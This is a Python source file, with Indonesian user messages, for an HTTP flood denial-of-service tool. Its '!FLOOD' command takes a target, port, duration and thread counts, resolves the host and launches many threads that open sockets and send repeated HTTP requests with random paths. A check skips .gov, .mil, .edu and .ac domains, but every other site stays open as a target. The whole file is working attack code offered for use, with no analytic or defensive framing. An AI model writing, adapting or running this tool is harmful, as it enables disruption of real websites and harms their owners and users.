# IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

# GLOBAL VARIABEL
stop_attack = threading.Event()

# FUNCTION TO CLEAR
def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

# URL PATH GENERATOR
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    return "".join(random.sample(msg, int(num)))

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    return ''.join(random.choice(letter) for _ in range(int(num)))

# DOS FUNCTION
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
    if stop_attack.is_set():
        return
    url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        packet_patterns = {
            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
        }
        packet = packet_patterns.get(data_type_loader_packet, packet_patterns['PY']).encode()
        s.connect((ip, port))
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet)
    except:
        pass
    finally:
        s.close()

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
    while time.time() < time_loader and not stop_attack.is_set():
        for _ in range(min(spam_loader, 10)):
            if stop_attack.is_set():
                break
            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
            th.start()

def countdown_timer(time_loader):
    while not stop_attack.is_set():
        remaining = int(time_loader - time.time())
        if remaining <= 0:
            print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
            stop_attack.set()
            break
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)

def wait_for_enter_to_stop():
    input()  # saat Enter ditekan kapan saja
    if not stop_attack.is_set():
        stop_attack.set()
        print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")

# MAIN COMMAND LOOP
def command():
    global stop_attack
    while True:
        try:
            user_input = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not user_input:
                continue

            args = user_input.split(" ")
            if args[0].lower() == "clear":
                clear_text()

            elif args[0].upper() == "!FLOOD":
                if len(args) == 10:
                    data_type_loader_packet = args[1].upper()
                    target_loader = args[2]
                    port_loader = int(args[3])
                    time_loader = time.time() + int(args[4])
                    spam_loader = int(args[5])
                    create_thread = min(int(args[6]), 10)
                    booter_sent = int(args[7])
                    methods_loader = args[8]
                    spam_create_thread = min(int(args[9]), 10)

                    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                    if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
                        print(f"{Fore.GREEN}Target {host} termasuk domain terproteksi{Fore.RESET}")
                        continue
                    try:
                        ip = socket.gethostbyname(host)
                    except socket.gaierror:
                        print(f"{Fore.RED}Gagal resolve IP dari host: {host}{Fore.RESET}")
                        continue

                    print(f"{Fore.LIGHTCYAN_EX}Menyerang Target: {target_loader} ({ip})\nPort: {port_loader}\nTipe: {data_type_loader_packet}{Fore.RESET}")
                    stop_attack.clear()

                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()

                    threading.Thread(target=countdown_timer, args=(time_loader,)).start()
                    threading.Thread(target=wait_for_enter_to_stop).start()

                    while not stop_attack.is_set():
                        time.sleep(0.2)  # tunggu hingga serangan selesai atau dihentikan
                    continue  # kembali ke COMMAND $

                else:
                    print(f"{Fore.RED}Format salah: !FLOOD <TYPE> <TARGET> <PORT> <TIME> <SPAM> <THREAD> <BOOTSENT> <METHOD> <SPAM_CREATE>{Fore.RESET}")

            else:
                print(f"{Fore.YELLOW}Command tidak dikenal: {user_input}{Fore.RESET}")

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}KeyboardInterrupt: keluar program...{Fore.RESET}")
            sys.exit(0)

# START PROGRAM
if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Dihentikan oleh pengguna...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
